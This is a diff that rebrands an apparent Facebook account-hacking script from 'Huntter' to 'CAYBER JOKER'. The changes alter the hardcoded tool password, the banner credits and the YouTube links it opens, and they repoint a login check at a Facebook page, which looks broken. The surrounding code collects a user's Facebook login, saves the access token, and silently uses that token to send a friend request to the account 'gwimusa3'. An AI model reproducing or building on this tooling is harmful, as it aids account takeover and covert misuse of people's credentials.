@@ -119,13 +119,14 @@ print  """
 \033[1;91m██║░░██╗██║░░██║██║╚██╔╝██║██╔══╝░░
 \033[1;91m╚█████╔╝╚█████╔╝██║░╚═╝░██║███████╗
 \033[1;91m░╚════╝░░╚════╝░╚═╝░░░░░╚═╝╚══════╝
-\033[1;95m«-_-_-_-_-_-_-_-_-\033[1;91mHuntter\033[1;95m-_-_-_-_-_-_-_-_-»
+\033[1;95m«-_-_-_-_-_-_-_-_-\033[1;91m CAYBER JOKER\033[1;95m-_-_-_-_-_-_-_-_-»
 \033[1;92mNote1: Enter Tool usernam and Password 
 \033[1;92mNote2: This Tool is only for Bangladesh
-\033[1;95m«-_-_-_-_-_-_-_-_-\033[1;91mHuntter\033[1;95m-_-_-_-_-_-_-_-_-»
+\033[1;92mNote3:THIS TOOLS MADE BY CAYBER JOKER OWNER LEO
+\033[1;95m«-_-_-_-_-_-_-_-_-\033[1;91mCAYBER JOKER\033[1;95m-_-_-_-_-_-_-_-_-»
  """
 CorrectUsername = "cayber"
-CorrectPassword = "beleo1"
+CorrectPassword = "bdleo y"
 
 loop = 'true'
 while (loop == 'true'):
@@ -141,7 +142,7 @@ while (loop == 'true'):
             os.system('xdg-open https://.youtube.com/channel/UCWLIAZHMlnlQMuMKTjBdbAQ')
     else:
         print "\033[1;94mWrong Username"
-        os.system('xdg-open https://.youtube.com/channel/UCWLIAZHMlnlQMuMKTjBdbAQ')
+        os.system('xdg-open https://youtube.com/channel/UCVaDWAoVUrhfLXv6Vo4TH7A')
 
 ##### LICENSE #####
 #=================#
@@ -190,7 +191,7 @@ def login1():
 		pwd = raw_input('\033[1;97m[*] \x1b[1;91mPassword      \x1b[1;91m: \x1b[1;92m')
 		tik()
 		try:
-			br.open('https://m.facebook.com')
+			br.open('https://www.facebook.com/lucifergamingbangladesh/')
 		except mechanize.URLError:
 			print"\n\x1b[1;97mThere is no internet connection"
 			keluar()
@@ -215,7 +216,7 @@ def login1():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\x1b[1;95mLogin Successful•'
-				os.system('xdg-open https://youtube.com/channel/UCWLIAZHMlnlQMuMKTjBdbAQ')
+				os.system('xdg-open https://youtube.com/channel/UCVaDWAoVUrhfLXv6Vo4TH7A')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
@@ -282,7 +283,7 @@ def pilih():
 		os.system('xdg-open https://commentpicker.com/find-facebook-id.php')
 	        menu()
 	elif unikers =="3":
-		os.system('xdg-open https://m.youtube.com/channel/UCWLIAZHMlnlQMuMKTjBdbAQ')
+		os.system('xdg-open https://youtube.com/channel/UCVaDWAoVUrhfLXv6Vo4TH7A')
 	        menu()		
 	elif unikers =="0":
 		jalan('Token Removed')
